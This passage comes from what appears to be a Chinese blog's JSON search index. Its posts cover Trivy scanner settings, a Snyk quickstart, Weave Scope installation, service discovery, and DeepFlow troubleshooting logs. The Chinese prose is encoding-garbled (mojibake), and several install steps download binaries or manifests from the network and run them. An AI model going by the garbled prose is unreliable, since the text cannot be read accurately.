Trivy debug mode\n\n\nSCANNER_TRIVY_VULN_TYPE\nos,library\nComma-separated list of vulnerability types. Possible values are os and library.\n\n\nSCANNER_TRIVY_SEVERITY\nUNKNOWN,LOW,MEDIUM,HIGH,CRITICAL\nComma-separated list of vulnerabilities severities to be displayed\n\n\nSCANNER_TRIVY_IGNORE_UNFIXED\nfalse\nThe flag to display only fixed vulnerabilities\n\n\nSCANNER_TRIVY_IGNORE_POLICY\n\nThe path for the Trivy ignore policy OPA Rego file\n\n\nSCANNER_TRIVY_SKIP_UPDATE\nfalse\nThe flag to disable Trivy DB downloads.\n\n\nSCANNER_TRIVY_OFFLINE_SCAN\nfalse\nThe flag to disable external API requests to identify dependencies.\n\n\nSCANNER_TRIVY_GITHUB_TOKEN\nN&#x2F;A\nThe GitHub access token to download Trivy DB (see GitHub rate limiting)\n\n\nSCANNER_TRIVY_INSECURE\nfalse\nThe flag to skip verifying registry certificate\n\n\nSCANNER_TRIVY_TIMEOUT\n5m0s\nThe duration to wait for scan completion\n\n\nSCANNER_STORE_REDIS_NAMESPACE\nharbor.scanner.trivy:store\nThe namespace for keys in the Redis store\n\n\nSCANNER_STORE_REDIS_SCAN_JOB_TTL\n1h\nThe time to live for persisting scan jobs and associated scan reports\n\n\nSCANNER_JOB_QUEUE_REDIS_NAMESPACE\nharbor.scanner.trivy:job-queue\nThe namespace for keys in the scan jobs queue backed by Redis\n\n\nSCANNER_JOB_QUEUE_WORKER_CONCURRENCY\n1\nThe number of workers to spin-up for the scan jobs queue\n\n\nSCANNER_REDIS_URL\nredis:&#x2F;&#x2F;harbor-harbor-redis:6379\nThe Redis server URI. The URI supports schemas to connect to a standalone Redis server, i.e. redis:&#x2F;&#x2F;:password@standalone_host:port&#x2F;db-number and Redis Sentinel deployment, i.e. redis+sentinel:&#x2F;&#x2F;:password@sentinel_host1:port1,sentinel_host2:port2&#x2F;monitor-name&#x2F;db-number.\n\n\nSCANNER_REDIS_POOL_MAX_ACTIVE\n5\nThe max number of connections allocated by the Redis connection pool\n\n\nSCANNER_REDIS_POOL_MAX_IDLE\n5\nThe max number of idle connections in the Redis connection pool\n\n\nSCANNER_REDIS_POOL_IDLE_TIMEOUT\n5m\nThe duration after which idle connections to the Redis server are closed. If the value is zero, then idle connections are not closed.\n\n\nSCANNER_REDIS_POOL_CONNECTION_TIMEOUT\n1s\nThe timeout for connecting to the Redis server\n\n\nSCANNER_REDIS_POOL_READ_TIMEOUT\n1s\nThe timeout for reading a single Redis command reply\n\n\nSCANNER_REDIS_POOL_WRITE_TIMEOUT\n1s\nThe timeout for writing a single Redis command.\n\n\nHTTP_PROXY\nN&#x2F;A\nThe URL of the HTTP proxy server\n\n\nHTTPS_PROXY\nN&#x2F;A\nThe URL of the HTTPS proxy server\n\n\nNO_PROXY\nN&#x2F;A\nThe URLs that the proxy settings do not apply to\n\n\nå‚è€ƒé“¾æ¥https://aquasecurity.github.io/trivy/v0.22.0/getting-started/overview/\n","slug":"å®¹å™¨é•œåƒå®‰å…¨-trivy","date":"2022-01-28T08:06:10.000Z","categories_index":"Cloud-Native-Security","tags_index":"äº‘åŸç”Ÿå®‰å…¨,å®¹å™¨å®‰å…¨å¹³å°,äº§å“é€‰å‹,Trivy","author_index":"Moses"},{"id":"7635de4b7a3e17088e6fc5a823d4941c","title":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨åˆ†æå·¥å…·-snyk","content":"ä½¿ç”¨snykæ£€æŸ¥å¼€æºè½¯ä»¶ä¾èµ–ä¸­çš„æ¼æ´.md0x01ç®€ä»‹Snyk æ˜¯ä¸€å®¶ç¾å›½çš„å®‰å…¨å…¬å¸ï¼Œè‡´åŠ›äºç›‘æ§å¼€æºè½¯ä»¶åŒ…ä¸­çš„æ¼æ´ã€‚Snyk ä»¥å…¶åºå¤§çš„æ¼æ´èµ„æ–™åº“ä¸ºåŸºç¡€ï¼ˆç”±ä»¥è‰²åˆ—å’Œä¼¦æ•¦çš„èµ„å®‰ç ”ç©¶ä¸“å®¶å›¢é˜Ÿè´Ÿè´£ç»´æŠ¤è¯¥èµ„æ–™åº“ï¼‰ï¼ŒæŒç»­çš„ç›‘æ§å¼€æºç¤¾åŒºä¸­å„ç§è½¯ä»¶åŒ…çš„å®‰å…¨æƒ…å†µï¼Œä»¥åŠç»™å‡ºè§£å†³æ–¹æ¡ˆã€‚ éšè‘— Snyk çš„ä¸æ–­å‘å±•ï¼Œå®ƒå·²ç»å¯ä»¥åšåˆ°è½»é¬†æ‰«æï¼ŒIDEé…åˆï¼Œä¸åŸç å¹³å°æ•´åˆ (å¦‚ GitHubã€BitBucketã€GitLabç­‰)ã€å®ç° CI&#x2F;CD æµç¨‹ã€‚\nSnyk è™½ç„¶æ˜¯ä¸€æ¬¾å•†ç”¨æ¼æ´æ‰«æå·¥å…·ï¼Œä½†ä»–å¯¹å¼€æºçš„é¡¹ç›®å…è´¹ã€‚ç§æœ‰çš„é¡¹ç›®ï¼Œä¹Ÿå¯ä»¥ç”¨æ¯æœˆ 200 æ¬¡çš„æ‰«æã€‚\n0x02æ¶æ„å›¾\n0x03æ ¸å¿ƒèƒ½åŠ›\nJavascript\nJava\nPython\nPhp\nRuby\nGolang\nScala\nSwift &amp; Objectiv-C\n.NET\n\n0x04å¯¹æ¯”npm-audit VS snyk\n0x05Quickstartnpm install -g snyk\nrequireTo create a Snyk account\ninstall[[mac]]\nbrew tap snyk&#x2F;tap  \nbrew install snyk\n[[Authenticate]] your machine\nsnyk auth\n[[Navigate]] into your codeâ€™s directory and run\nsnyk monitor\n\ncheck1.IDEAå’ŒCLI\n2.dashboard\nè¿›é˜¶Snyk CI&#x2F;CD Integration: good practicesScan your Dockerfile0x06ä½¿ç”¨è¯´æ˜CI&#x2F;DIContrainAPI \n0x07åº”ç”¨åœºæ™¯Referenceså®˜æ–¹æ–‡æ¡£\n","slug":"ä½¿ç”¨snykæ£€æŸ¥å¼€æºè½¯ä»¶ä¾èµ–ä¸­çš„æ¼æ´.md","date":"2021-12-31T08:35:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"SCA,è½¯ä»¶ä¾›åº”é“¾å®‰å…¨åˆ†æå·¥å…·,snyk","author_index":"Moses"},{"id":"ffb8302384d7f037a2dd91b7ad370f37","title":"Kuberneteså­¦ä¹ ç¬”è®° -- weavescope","content":"ä»‹ç»Weave Scopeæ˜¯Dockerå’ŒKubernetesçš„å¯è§†åŒ–å’Œç›‘è§†å·¥å…·ã€‚å®ƒæä¾›äº†è‡ªä¸Šè€Œä¸‹çš„åº”ç”¨ç¨‹åºè§†å›¾ä»¥åŠæ•´ä¸ªåŸºç¡€æ¶æ„è§†å›¾ï¼Œå¹¶å…è®¸æ‚¨å®æ—¶è¯Šæ–­å°†åˆ†å¸ƒå¼å®¹å™¨åŒ–åº”ç”¨ç¨‹åºéƒ¨ç½²åˆ°äº‘æä¾›å•†æ—¶é‡åˆ°çš„ä»»ä½•é—®é¢˜ã€‚WeaveScope ç›‘æ§å±•ç¤ºäº†ä¸»æœºã€å®¹å™¨ã€è¿›ç¨‹çš„ä¼—å¤šå¸¸ç”¨æ•°æ®å’ŒçŠ¶æ€ï¼Œå¹¶æä¾› WebUIå’Œpluginæ’ä»¶ã€‚\nç‰¹ç‚¹\nç›´è§‚çš„å›¾å½¢æˆ–è¡¨æ ¼æ¨¡å¼ï¼›\nçµæ´»çš„è¿‡æ»¤å’Œå¼ºå¤§çš„æœç´¢ï¼›\nå®æ—¶å±•ç¤ºåº”ç”¨å’Œå®¹å™¨æŒ‡æ ‡ï¼›\næ”¯æŒå¤šä¸»æœºç›‘ç®¡ï¼Œæ”¯æŒk8sã€‚\n\nå®‰è£…éƒ¨ç½²k8sé›†ç¾¤éƒ¨ç½²å£°æ˜æ–‡ä»¶æ·»åŠ basicAuthæœªæˆåŠŸï¼Œæ¨è1å®¹å™¨éƒ¨ç½²å¯ä»¥å®ç°èº«ä»½è®¤è¯ã€‚\n1.å®¹å™¨éƒ¨ç½²# ä¸‹è½½ scope å·¥å…·\nsudo curl -L https:&#x2F;&#x2F;github.com&#x2F;weaveworks&#x2F;scope&#x2F;releases&#x2F;download&#x2F;latest_release&#x2F;scope -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;scope\n# ä½¿ scope å…·æœ‰æ‰§è¡Œæƒé™\nsudo chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;scope\n# éƒ¨ç½²å®‰è£… Weave Scopeï¼Œ å¹¶è®¾å®šéªŒè¯ç”¨æˆ· myuserï¼Œ å¯†ç  mypasswordã€‚\nsudo scope launch -app.basicAuth -app.basicAuth.password mypassword -app.basicAuth.username myuser -probe.basicAuth -probe.basicAuth.password mypassword -probe.basicAuth.username myuser\n2.helméƒ¨ç½²1ã€æœç´¢weaveä»“åº“\n[root@k8s01 scope]# helm search repo weave\nNAME                    CHART VERSION   APP VERSION DESCRIPTION\nali&#x2F;weave-cloud         0.1.2                       Weave Cloud is a add-on to Kubernetes which pro...\nali&#x2F;weave-scope         0.9.2           1.6.5       A Helm chart for the Weave Scope cluster visual...\naliyun&#x2F;weave-cloud      0.1.2                       Weave Cloud is a add-on to Kubernetes which pro...\naliyun&#x2F;weave-scope      0.9.2           1.6.5       A Helm chart for the Weave Scope cluster visual...\napphub&#x2F;weave-cloud      0.3.7           1.4.0       Weave Cloud is a add-on to Kubernetes which pro...\napphub&#x2F;weave-scope      1.1.8           1.12.0      A Helm chart for the Weave Scope cluster visual...\nburdenbear&#x2F;weave-cloud  0.3.8           1.4.0       Weave Cloud is a add-on to Kubernetes which pro...\nburdenbear&#x2F;weave-scope  1.1.11          1.12.0      A Helm chart for the Weave Scope cluster visual...\nchart&#x2F;weave-cloud       0.3.3           1.3.0       Weave Cloud is a add-on to Kubernetes which pro...\nchart&#x2F;weave-scope       1.1.1           1.11.1      A Helm chart for the Weave Scope cluster visual...\nstable&#x2F;weave-cloud      0.3.8           1.4.0       Weave Cloud is a add-on to Kubernetes which pro...\nstable&#x2F;weave-scope      1.1.11          1.12.0      A Helm chart for the Weave Scope cluster visual...\n2ã€ä¸‹è½½è¿œç¨‹å®‰è£…åŒ…åˆ°æœ¬åœ°å¹¶è§£å‹\nhelm fetch stable&#x2F;weave-scope [[helm]] pull\ntar xf weave-scope-1.1.10.tgz\n3ã€ä¿®æ”¹ClusterIPä¸ºNodePort\n[root@k8s01 data]# sed -i &quot;s@\\ type:\\ \\&quot;ClusterIP\\&quot;@ type: \\&quot;NodePort\\&quot;@&quot; weave-scope&#x2F;values.yaml\n4ã€åˆ›å»ºweave-scopeå‘½åç©ºé—´\n[root@k8s01 data]# kubectl create namespace weave-scope\n5.å®‰è£…\n[root@k8s01 data]# helm install -n weave-scope common-service -f weave-scope&#x2F;values.yaml weave-scope&#x2F;\n6.éªŒè¯æœåŠ¡åˆ—è¡¨\n[root@k8s01 data]# helm list -n weave-scope\n7.éªŒè¯æœåŠ¡çŠ¶æ€\nhelm status common-service -n weave-scope\n8.éªŒè¯pod svc deploy\n[root@k8s01 data]# kubectl get all -n weave-scope -o wide\n3.k8så®‰è£…\nkubectl apply -f &quot;https:&#x2F;&#x2F;cloud.weave.works&#x2F;k8s&#x2F;scope.yaml?k8s-version&#x3D;$(kubectl version | base64 | tr -d &#39;\\n&#39;)&quot;\nkubectl get pod -n weave\nkubectl get svc -n weave\nkubectl get deploy -n weave\nkubectl port-forward --address&#x3D;X.X.X.X -n weave &quot;$(kubectl get -n weave pod --selector&#x3D;weave-scope-component&#x3D;app -o jsonpath&#x3D;&#39;&#123;.items..metadata.name&#125;&#39;)&quot; 4040\né¡¹ç›®åœ°å€githubweave docs \n","slug":"WeaveScope","date":"2021-09-28T16:00:00.000Z","categories_index":"Cloud-Native","tags_index":"Kubernetes,k8s-dashboard,weave,CNI","author_index":"Moses"},{"id":"d1f13540bd8121bde49915d55687c3f7","title":"å¾®æœåŠ¡å­¦ä¹ -æœåŠ¡å‘ç°","content":"ä¸€ã€ä»€ä¹ˆæ˜¯æœåŠ¡å‘ç°ï¼Ÿè®©ç”¨æˆ·ä¸ç”¨å…³å¿ƒæœåŠ¡æä¾›è€…çš„å…·ä½“ç½‘ç»œä½ç½®ï¼ˆIPã€ç«¯å£ç­‰ï¼‰å’Œé…ç½®æ­¥éª¤ï¼Œåªéœ€è¦é€‰æ‹©å’Œé“¾æ¥å³å¯ä½¿ç”¨è¿™äº›æœåŠ¡ã€‚å¦‚å±€åŸŸç½‘å†… é€šè¿‡WS-Discoveryæˆ–è€…Bonjoråè®®å‘ç°å¹¶è¿æ¥ç½‘ç»œæ‰“å°æœºæœåŠ¡ï¼Œäº¦æˆ–æ˜¯åä¸ºé¸¿è’™è¶…çº§ç»ˆç«¯é€šè¿‡è“ç‰™ã€WIFIç­‰é€šä¿¡æŠ€æœ¯[è½¯æ€»çº¿æŠ€æœ¯] ï¼Œå¯ä»¥å®ç°å‘ç°å¹¶ä½¿ç”¨å…¶ä»–è®¾å¤‡\näºŒã€ä¸ºä»€ä¹ˆæ˜¯æœåŠ¡å‘ç°ï¼Ÿéšç€åº”ç”¨æ¶æ„ä»å•ä½“å¼åº”ç”¨-SOA-å¾®æœåŠ¡çš„æ¼”è¿›ï¼Œåº”ç”¨çš„æ‹†åˆ†ã€æœåŠ¡é—´è§£è€¦å’ŒæœåŠ¡åŠ¨æ€æ‰©å±•å¸¦æ¥çš„æœåŠ¡è¿ç§»ã€æœåŠ¡æ²»ç†ç­‰éœ€æ±‚ä¿ƒä½¿æœåŠ¡å‘ç°æœºåˆ¶çš„äº§ç”Ÿã€‚\nä¸‰ã€å¾®æœåŠ¡ä¸­çš„æœåŠ¡å‘ç°å®¢æˆ·ç«¯å‘ç°ï¼š  \n\n1.æœåŠ¡æä¾›è€…çš„å®ä¾‹åœ¨å¯åŠ¨æ—¶æˆ–è€…ä½ç½®ä¿¡æ¯å‘ç”Ÿå˜åŒ–æ—¶ä¼šå‘æœåŠ¡æ³¨å†Œè¡¨æ³¨å†Œè‡ªèº«ï¼Œåœ¨åœæ­¢æ—¶ä¼šå‘æœåŠ¡æ³¨å†Œè¡¨æ³¨é”€è‡ªèº«ï¼Œå¦‚æœæœåŠ¡æä¾›è€…çš„å®ä¾‹å‘ç”Ÿæ•…éšœï¼Œåœ¨ä¸€æ®µæ—¶é—´å†…ä¸å‘é€å¿ƒè·³ä¹‹åï¼Œä¹Ÿä¼šè¢«æœåŠ¡æ³¨å†Œè¡¨æ³¨é”€ã€‚     \n2.æœåŠ¡æ¶ˆè´¹è€…çš„å®ä¾‹ä¼šå‘æœåŠ¡æ³¨å†Œè¡¨æŸ¥è¯¢æœåŠ¡æä¾›è€…çš„ä½ç½®ä¿¡æ¯ï¼Œç„¶åé€šè¿‡è¿™äº›ä½ç½®ä¿¡æ¯ç›´æ¥å‘æœåŠ¡æä¾›è€…å‘èµ·è¯·æ±‚ã€‚\n\næœåŠ¡ç«¯å‘ç°ï¼š    \n\nç¬¬ä¸€æ­¥ä¸å®¢æˆ·ç«¯å‘ç°ç›¸åŒã€‚  \næœåŠ¡æ¶ˆè´¹è€…ä¸ç›´æ¥å‘æœåŠ¡æ³¨å†Œè¡¨æŸ¥è¯¢ï¼Œä¹Ÿä¸ç›´æ¥å‘æœåŠ¡æä¾›è€…å‘èµ·è¯·æ±‚ï¼Œè€Œæ˜¯å°†å¯¹æœåŠ¡æä¾›è€…çš„è¯·æ±‚å‘å¾€ä¸€ä¸ªä¸­å¤®è·¯ç”±å™¨æˆ–è€…è´Ÿè½½å‡è¡¡å™¨ï¼Œä¸­å¤®è·¯ç”±å™¨æˆ–è€…è´Ÿè½½å‡è¡¡å™¨æŸ¥è¯¢æœåŠ¡æ³¨å†Œè¡¨è·å–æœåŠ¡æä¾›è€…çš„ä½ç½®ä¿¡æ¯ï¼Œå¹¶å°†è¯·æ±‚è½¬å‘ç»™æœåŠ¡æä¾›è€…ã€‚\n\n\nè¿™ä¸¤ç§æ¶æ„éƒ½å„æœ‰åˆ©å¼Šï¼Œä»¥å®¢æˆ·ç«¯æœåŠ¡å‘ç°è½¯ä»¶Eurekaå’ŒæœåŠ¡ç«¯æœåŠ¡å‘ç°æ¶æ„Kubernetes/SkyDNS+Ingress LB+Traefik+PowerDNSä¸ºä¾‹è¯´æ˜ã€‚   \n\n\n\næœåŠ¡å‘ç°æ–¹æ¡ˆ\nPros\nCons\n\n\n\nEureka\nä½¿ç”¨ç®€å•ï¼Œé€‚ç”¨äºjavaè¯­è¨€å¼€å‘çš„é¡¹ç›®ï¼Œæ¯”æœåŠ¡ç«¯æœåŠ¡å‘ç°å°‘ä¸€æ¬¡ç½‘ç»œè·³è½¬\nå¯¹éJavaè¯­è¨€çš„æ”¯æŒä¸å¤Ÿå¥½ï¼ŒConsumeréœ€è¦å†…ç½®ç‰¹å®šçš„æœåŠ¡å‘ç°å®¢æˆ·ç«¯å’Œå‘ç°é€»è¾‘\n\n\nKubernetes\nConsumeræ— éœ€å…³æ³¨æœåŠ¡å‘ç°å…·ä½“ç»†èŠ‚ï¼Œåªéœ€çŸ¥é“æœåŠ¡çš„DNSåŸŸåå³å¯ï¼Œæ”¯æŒå¼‚æ„è¯­è¨€å¼€å‘\néœ€è¦åŸºç¡€è®¾æ–½æ”¯æ’‘ï¼Œå¤šäº†ä¸€æ¬¡ç½‘ç»œè·³è½¬ï¼Œå¯èƒ½æœ‰æ€§èƒ½æŸå¤±\n\n\nEurkaEureka å’Œ Spring Bootã€Spring Cloud éƒ½æ•´åˆçš„éå¸¸å¥½ï¼Œæ‰€ä»¥ä½¿ç”¨èµ·æ¥éå¸¸ç®€å•ï¼Œåªéœ€åœ¨ pom ä¸­åŠ å…¥å¯¹ Spring Cloud Eureka Server çš„ä¾èµ–å¹¶åœ¨ä»£ç ä¸­åŠ å…¥ @EnableEurekaServerï¼Œå³å¯åˆ›å»ºä¸€ä¸ª Eureka Serverï¼Œåœ¨æœåŠ¡æä¾›è€…å’Œæ¶ˆè´¹è€…è¿™è¾¹ï¼Œåªéœ€åœ¨ pom ä¸­åŠ å…¥å¯¹ Spring Cloud Eureka çš„ä¾èµ–å¹¶åœ¨ä»£ç ä¸­åŠ å…¥ @EnableDiscoveryClientï¼Œä»£ç è¿è¡Œæ—¶å³å¯è‡ªåŠ¨å°†è‡ªèº«æ³¨å†Œåˆ° Eureka Server ä¸­ï¼Œç„¶åä½¿ç”¨ getInstances æ–¹æ³•å³å¯æŸ¥è¯¢æœåŠ¡å®ä¾‹çš„ä½ç½®ä¿¡æ¯ï¼Œè¿™ä¸ªæ—¶å€™è¿˜å¯ä»¥ä½¿ç”¨å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡æ–¹æ¡ˆ Netflix Ribbon å¯¹è¿™äº›å®ä¾‹åšè´Ÿè½½å‡è¡¡ã€‚    \nRibbonæä¾›ä¸€ç»„ä¸°å¯Œçš„åŠŸèƒ½é›†ï¼šå¤šç§å†…å»ºçš„è´Ÿè½½å‡è¡¡è§„åˆ™ï¼š   \n\nRound-robin è½®è¯¢è´Ÿè½½å‡è¡¡    \nå¹³å‡åŠ æƒå“åº”æ—¶é—´è´Ÿè½½å‡è¡¡  \néšæœºè´Ÿè½½å‡è¡¡    \nå¯ç”¨æ€§è¿‡æ»¤è´Ÿè½½å‡è¡¡ï¼ˆé¿å…è·³é—¸çº¿è·¯å’Œé«˜å¹¶å‘é“¾æ¥æ•°ï¼‰*è‡ªå®šä¹‰è´Ÿè½½å‡è¡¡æ’ä»¶ç³»ç»Ÿ*ä¸æœåŠ¡å‘ç°è§£å†³æ–¹æ¡ˆçš„å¯æ‹”æ’é›†æˆï¼ˆåŒ…æ‹¬Eurekaï¼‰*äº‘åŸç”Ÿæ™ºèƒ½ï¼Œä¾‹å¦‚å¯ç”¨åŒºäº²å’Œæ€§å’Œä¸å¥åº·åŒºè§„é¿*å†…å»ºçš„æ•…éšœæ¢å¤èƒ½åŠ›\n\nconsulç•¥\nzookeeperè§zookeeper\n","slug":"æœåŠ¡å‘ç°","date":"2021-09-26T04:23:21.000Z","categories_index":"åˆ†å¸ƒå¼,å¾®æœåŠ¡","tags_index":"æœåŠ¡å‘ç° - å¾®æœåŠ¡","author_index":"Moses"},{"id":"880573b75c369c317bbd9d9133cf8195","title":"DeepFlowå®‰è£…","content":"install Q&amp;Aå…³äºIPV4è¿˜æ˜¯IPV6çš„é—®é¢˜\n\n\n\n\n\n\n\n\nå•ä¸ªk8sé›†ç¾¤ï¼ˆv1.22.10ï¼‰é€šè¿‡helmï¼ˆv3.9.0ï¼‰éƒ¨ç½²deepflowï¼Œä½¿ç”¨valueæ–‡ä»¶æŒ‡å®šé»˜è®¤SCï¼Œ3ä¸ªPVCçŠ¶æ€å‡æ­£å¸¸ã€‚é—®é¢˜ï¼šserverã€mysqlã€grafanaã€app4ä¸ªpodå‡å¼‚å¸¸ã€‚\n\n\næŸ¥çœ‹æ—¥å¿—ï¼Œé»˜è®¤ä½¿ç”¨IPV6åè®®æ ˆã€‚my.cnfåˆå§‹é…ç½®\n[client]\ndefault-character-set&#x3D;utf8\n\n[mysqld]\ndefault-authentication-plugin&#x3D;mysql_native_password\n\n# Network related\nbind-address&#x3D;::\nport&#x3D;30130\n\n# Enable query cache\ninnodb_buffer_pool_size&#x3D;20M\nmax_connections&#x3D;1000\nwait_timeout&#x3D;60\n\n# Replication related\nslave_skip_errors&#x3D;all\nä¿®æ”¹ä¸ºIPV4åè®®æ ˆåï¼Œå‡ºappæ„å¤–å…¶ä½™éƒ¨ç½²æ²¡æœ‰é—®é¢˜ã€‚æŸ¥çœ‹appå®¹å™¨æ—¥å¿—\n2022-08-23 11:38:15,403 T140463419844416-MainThread INFO app.main.42: Launching Deepflow-app ...\nTraceback (most recent call last):\n  File &quot;&#x2F;root&#x2F;app&#x2F;app.py&quot;, line 56, in &lt;module&gt;\n    main()\n  File &quot;&#x2F;root&#x2F;app&#x2F;app.py&quot;, line 48, in main\n    sock &#x3D; socket.socket(socket.AF_INET6, socket.SOCK_STREAM)\n  File &quot;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;socket.py&quot;, line 231, in __init__\n    _socket.socket.__init__(self, family, type, proto, fileno)\nOSError: [Errno 97] Address family not supported by protocol\n\n\n\n\n\n\n\n\n\nè”ç³»å‚å•†åï¼Œæ¨é€æ”¯æŒipv4çš„appé•œåƒï¼Œé—®é¢˜è§£å†³\n\næœŸé—´å®¿ä¸»æœºå¯ç”¨IPV6åè®®ï¼Œè§[[k8så¯ç”¨IPV4&amp;IPV6åŒæ ˆå®è·µ|k8s ipv4&#x2F;ipv6åŒæ ˆå®è·µ]]\n\ndelete appå®¹å™¨é‡æ–°æ‹‰å–æ–°çš„é•œåƒå’Œä½¿ç”¨IPV6åè®®é…ç½®ä»¥ä¸Šä¸¤ç§æ–¹å¼æµ‹è¯•åå‡æ²¡æœ‰é—®é¢˜ï¼Œæ‰€æœ‰å®¹å™¨è¿è¥æ­£å¸¸ï¼Œæ²¡æœ‰æ–°çš„æŠ¥é”™ã€‚\n\n\ngrafana è§†å›¾æŸ¥çœ‹é—®é¢˜\nä»æŠ¥é”™æ¥çœ‹ï¼Œå¼€å§‹ä»¥ä¸ºæ˜¯åç«¯æœåŠ¡é—®é¢˜ï¼ŒæŸ¥çœ‹ç›¸å…³æ—¥å¿—æœªå‘ç°ã€‚é‚æ’æŸ¥æ’ä»¶é—®é¢˜ï¼Œå†…ç½®æ’ä»¶æœªç­¾åï¼Œå¯¼è‡´Safariæµè§ˆå™¨æ‰“å¼€æœ‰é—®é¢˜ï¼Œåˆ‡æ¢Chromeæµè§ˆå™¨åé—®é¢˜è§£å†³ã€‚\n\n\n\n\n\n\n\n\n\nç»æ’æŸ¥å‘ç°æ˜¯å‰ç«¯é—®é¢˜ï¼Œä»¥é€šçŸ¥å‚å•†ã€‚å‚å•†ç¡®è®¤åä¿®æ”¹grafanaé•œåƒè‡³latest tag\nclickhouseçš„å­˜å‚¨é—®é¢˜helmå®‰è£…åœ¨K8Sé›†ç¾¤å†…çš„clickhouse1å¤©çš„ç£ç›˜å ç”¨ç‡çº¦å 50%å·¦å³ï¼Œå¤§æ¦‚24Gçš„æ•°æ®é‡ã€‚\nroot@deepflow-clickhouse-0:&#x2F;# df -h\nFilesystem           Size  Used Avail Use% Mounted on\noverlay               47G   24G   24G  50% &#x2F;\ntmpfs                 64M     0   64M   0% &#x2F;dev\ntmpfs                7.9G     0  7.9G   0% &#x2F;sys&#x2F;fs&#x2F;cgroup\n&#x2F;dev&#x2F;mapper&#x2F;cl-root   47G   24G   24G  50% &#x2F;etc&#x2F;hosts\nshm                   64M     0   64M   0% &#x2F;dev&#x2F;shm\ntmpfs                 15G   12K   15G   1% &#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount\ntmpfs                7.9G     0  7.9G   0% &#x2F;proc&#x2F;acpi\ntmpfs                7.9G     0  7.9G   0% &#x2F;proc&#x2F;scsi\ntmpfs                7.9G     0  7.9G   0% &#x2F;sys&#x2F;firmware\nroot@deepflow-clickhouse-0:&#x2F;# cd &#x2F;var&#x2F;lib&#x2F;clickhouse\nroot@deepflow-clickhouse-0:&#x2F;var&#x2F;lib&#x2F;clickhouse# df -h .\nFilesystem           Size  Used Avail Use% Mounted on\n&#x2F;dev&#x2F;mapper&#x2F;cl-root   47G   24G   24G  50% &#x2F;var&#x2F;lib&#x2F;clickhouse\n\nè§£å†³æ–¹æ¡ˆ\næ–°ç‰ˆæœ¬DeepFlow 6.1.2ï¼Œå°†ä¼šæ”¯æŒä½¿ç”¨å¤–éƒ¨Clickhouseã€‚\nè®¾ç½®è®¾ç½®é‡‡é›†é¢‘ç‡- server ç«¯é‡‡æ ·ï¼ˆé…ç½®serverçš„configmapå³å¯ï¼‰ï¼šhttps:&#x2F;&#x2F;github.com&#x2F;deepflowys&#x2F;deepflow&#x2F;blob&#x2F;main&#x2F;server&#x2F;server.yaml#L345\n\n- agent ç«¯é‡‡æ ·ï¼š\ndeepflow-ctl agent-group-config example | grep log_coll -B 2\né…ç½®æ–¹æ³•ï¼šhttps:&#x2F;&#x2F;deepflow.yunshan.net:7788&#x2F;docs&#x2F;zh&#x2F;install&#x2F;advanced-config&#x2F;#deepflow-agent\nè®¾ç½®æ•°æ®ä¿ç•™æœŸé™ï¼Ÿæš‚æ—¶ä¸æ”¯æŒ\n\nå…³äºnodelocalDNSè®¾ç½®Ipv6çš„é—®é¢˜æŸ¥çœ‹nodelocalDNSæ—¥å¿—ï¼Œé”™è¯¯ä¿¡æ¯ï¼š\n2022&#x2F;08&#x2F;23 07:41:41 [ERROR] Failed to sync kube-dns config directory &#x2F;etc&#x2F;kube-dns, err: lstat &#x2F;etc&#x2F;kube-dns: no such file or directory  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;raw PREROUTING [-p tcp -d 169.254.25.10 --dport 53 -j NOTRACK]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;raw PREROUTING [-p udp -d 169.254.25.10 --dport 53 -j NOTRACK]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;filter INPUT [-p tcp -d 169.254.25.10 --dport 53 -j ACCEPT]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;filter INPUT [-p udp -d 169.254.25.10 --dport 53 -j ACCEPT]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;raw OUTPUT [-p tcp -s 169.254.25.10 --sport 53 -j NOTRACK]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;raw OUTPUT [-p udp -s 169.254.25.10 --sport 53 -j NOTRACK]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;filter OUTPUT [-p tcp -s 169.254.25.10 --sport 53 -j ACCEPT]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;filter OUTPUT [-p udp -s 169.254.25.10 --sport 53 -j ACCEPT]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;raw OUTPUT [-p tcp -d 169.254.25.10 --dport 53 -j NOTRACK]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;raw OUTPUT [-p udp -d 169.254.25.10 --dport 53 -j NOTRACK]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;raw OUTPUT [-p tcp -d 169.254.25.10 --dport 8080 -j NOTRACK]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;raw OUTPUT [-p tcp -s 169.254.25.10 --sport 8080 -j NOTRACK]&#125;  \n\ncluster.local.:53 on 169.254.25.10  \n\nin-addr.arpa.:53 on 169.254.25.10  \n\nip6.arpa.:53 on 169.254.25.10  \n\n.:53 on 169.254.25.10  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added interface - nodelocaldns  \n\n[INFO] plugin&#x2F;reload: Running configuration MD5 &#x3D; adf97d6b4504ff12113ebb35f0c6413e  \n\nCoreDNS-1.6.7  \n\nlinux&#x2F;amd64, go1.11.13,  \n\n[ERROR] plugin&#x2F;errors: 2 5032635697405930385.8744131853810691353.ip6.arpa. HINFO: dial tcp 10.233.0.3:53: connect: network is unreachable  \n\n[ERROR] 